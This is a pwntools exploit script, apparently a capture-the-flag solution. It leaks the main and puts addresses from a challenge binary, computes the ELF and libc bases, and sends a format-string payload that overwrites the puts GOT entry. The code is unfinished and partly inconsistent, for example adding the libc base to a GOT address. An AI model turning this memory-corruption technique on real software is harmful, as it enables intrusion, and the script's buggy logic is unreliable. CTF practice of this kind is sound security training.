from pwn import *

elf = context.binary = ELF('./DolceVitaCaffePie')
libc = elf.libc
context.log_level = 'debug'

gdbscript='''
continue
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

def got_ow(target_addr,elf_base, libc_base):
    payload = {
                elf.got.puts+libc_base: target_addr+elf_base
            }
    payload = fmtstr_payload(10,payload,write_size='short')
    return payload 

def main():
    p = conn()

    for i in range(3):  
        p.recvuntil(b"[y/n]: ")
        p.sendline(b"y")
        if i == 0:
            p.recvuntil(b"convince us.")
            lines = p.recvlines(7)
            decoded_lines = [line.decode('utf-8') for line in lines]
            # decoded_lines = str(decoded_lines).split('.......................')
            # decoded_lines = str(decoded_lines).strip(' ')

            # addr = "".join(decoded_lines)[211:-30].split(' ')[0].strip(' ').split('.')[0]
            addr = "".join(decoded_lines)[40:].split(' ') #.split(' ')[0].strip(' ').split('.')[0]
            main = addr[0].split('.')[0]
            puts = addr[3].split('.......................')[1].split('.')[0]
            main_leak = int(main)
            puts_leak = int(puts)
            elf_base = main_leak - elf.sym.main
            info(f"plt base : {hex(elf_base)}")

            ## overwriting puts with main to loop again
            # payload = got_ow(elf.sym.main+elf_base)  

            libc_base = puts_leak - libc.sym.puts
            info(f" libc base : {hex(libc_base)}")

            info(f"puts got : {hex(elf.got.puts+libc_base)}")
            # info(f"puts plt : {hex(elf.plt.puts+libc_base)}")
            info(f"win : {hex(elf.sym.win+elf_base)}")
            # pause()

    p.recvuntil(b"> ")  
    # pause()
    payload = got_ow(elf.sym.main,elf_base,libc_base)
    p.sendline(payload)
    # p.recvuntil(b"[y/n]: ")
    p.interactive() 

if __name__ == "__main__":
    main()

